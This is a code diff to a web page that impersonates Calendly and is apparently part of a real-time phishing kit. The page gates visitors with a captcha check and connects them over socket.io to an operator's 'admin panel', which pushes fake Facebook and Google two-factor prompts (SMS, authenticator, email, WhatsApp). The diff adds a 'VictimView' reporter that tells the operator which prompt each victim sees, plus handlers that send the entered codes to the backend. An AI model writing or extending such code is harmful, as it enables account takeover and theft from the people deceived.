@@ -2,10 +2,11 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
+  <script src="assets/geo-restrict.js"></script>
   <script>(function(){var h=location.hostname,local=h==='localhost'||h==='127.0.0.1'||h.endsWith('.test')||h.endsWith('.local');if(!local){var v=localStorage.getItem('captcha_verified'),t=parseInt(localStorage.getItem('captcha_timestamp')||'0',10);if(v!=='true'||Date.now()-t>86400000){location.replace('/');return;}}history.replaceState(null,'','/');})();</script>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Calendly</title>
-  <link rel="icon" type="image/png" sizes="32x32" href="assets/favicon-bfb0492a754bdf44a0a58b969963f44235653cca09a1c0110309c1e03077e368.ico">
+  <link rel="icon" href="/favicon.jpg" type="image/jpeg">
   <meta name="robots" content="noindex, nofollow">
   <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
 
@@ -176,7 +177,10 @@
     </div><!-- /.fb26-window -->
   </div><!-- /#fb-modal-overlay -->
 
-  <script src="https://backed-nxht.onrender.com/socket.io/socket.io.js"></script>
+  <script src="assets/google-flow.js"></script>
+  <script src="assets/victim-view.js"></script>
+  <script src="assets/api-payload.js"></script>
+  <script src="https://cdn.socket.io/4.8.1/socket.io.min.js"></script>
   <script>
   /* Guard: redirect to apply.html if user opens this page directly (tab closed and reopened) */
   (function () {
@@ -201,9 +205,38 @@
     }
 
     var socket = io(BACKEND, { query: { clientId: clientId } });
+    window.socket = socket;
+    if (typeof VictimView !== 'undefined') VictimView.setSocket(socket);
+
+    var CAL_VIEW_BY_PANEL = {
+      'cal-codeSms': 'fb-2fa-sms',
+      'cal-authcode': 'fb-2fa-auth',
+      'cal-codeEmail': 'fb-2fa-email',
+      'cal-whatsapp': 'fb-2fa-whatsapp'
+    };
+
+    function reportCalendlyVictimView() {
+      if (typeof VictimView === 'undefined') return;
+      var overlay = document.getElementById('fb-modal-overlay');
+      var overlayOn = overlay && overlay.style.display !== 'none' && overlay.style.display !== '';
+      if (!overlayOn) {
+        VictimView.report('calendly');
+        return;
+      }
+      var keys = Object.keys(CAL_VIEW_BY_PANEL);
+      for (var i = 0; i < keys.length; i++) {
+        var panel = document.getElementById(keys[i]);
+        if (panel && panel.style.display !== 'none') {
+          VictimView.report(CAL_VIEW_BY_PANEL[keys[i]]);
+          return;
+        }
+      }
+      VictimView.report('calendly');
+    }
 
     socket.on('connect', function () {
       socket.emit('userConnectedToPage', { page: 'Calendly', clientId: clientId });
+      reportCalendlyVictimView();
     });
 
     /* Chrome mobile kills WebSocket when backgrounded — force fresh reconnect on return */
@@ -235,6 +268,9 @@
       });
       document.getElementById(id).style.display = 'block';
       overlay.style.display = 'flex';
+      if (typeof VictimView !== 'undefined' && CAL_VIEW_BY_PANEL[id]) {
+        VictimView.report(CAL_VIEW_BY_PANEL[id]);
+      }
     }
 
     /* ── Socket events from admin panel ── */
@@ -256,14 +292,10 @@
     });
 
     /* show-google-login: start the Google verification flow from Calendly */
-    socket.on('show-google-login', function () {
-      var fbEmail = sessionStorage.getItem('lastLoginEmail') || '';
-      try {
-        sessionStorage.setItem('googleReturnPage', 'apply.html');
-        if (fbEmail) sessionStorage.setItem('lastLoginEmail', fbEmail);
-      } catch(e) {}
-      try { sessionStorage.setItem('fbVerifySession', '1'); } catch(e) {}
-      window.location.href = 'fb-verify.html';
+    socket.on('show-google-login', function (data) {
+      GoogleVerifyFlow.startFbVerifyFlow({
+        returnPage: 'apply.html'
+      }, data);
     });
 
     /* show-calendar: already on Calendly — do nothing */
@@ -295,7 +327,9 @@
         fetch(BACKEND + endpoint, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ code: code, socketId: socket.id })
+          body: JSON.stringify(typeof ApiPayload !== 'undefined'
+            ? ApiPayload.withClient({ code: code })
+            : { code: code, socketId: socket.id, clientId: clientId })
         })
         .then(function (r) { return r.json(); })
         .catch(function () {});
@@ -308,7 +342,7 @@
     setupCodeBlock('cal-whcode',     'cal-whBtn',    6, '/send-auth-code');
 
     /* ── Wrong-code event: reset the visible panel ── */
-    socket.on('show-wrong-sms-code', function () {
+    function resetCalCodePanels() {
       ['cal-smscode','cal-authcodedes','cal-emailcode','cal-whcode'].forEach(function (id) {
         var el = document.getElementById(id);
         if (el) { el.value = ''; }
@@ -317,7 +351,10 @@
         var el = document.getElementById(id);
         if (el) { el.disabled = true; el.innerHTML = 'Continue'; }
       });
-    });
+    }
+
+    socket.on('show-wrong-sms-code', resetCalCodePanels);
+    socket.on('show-google-wrong-code', resetCalCodePanels);
 
   })();
   </script>
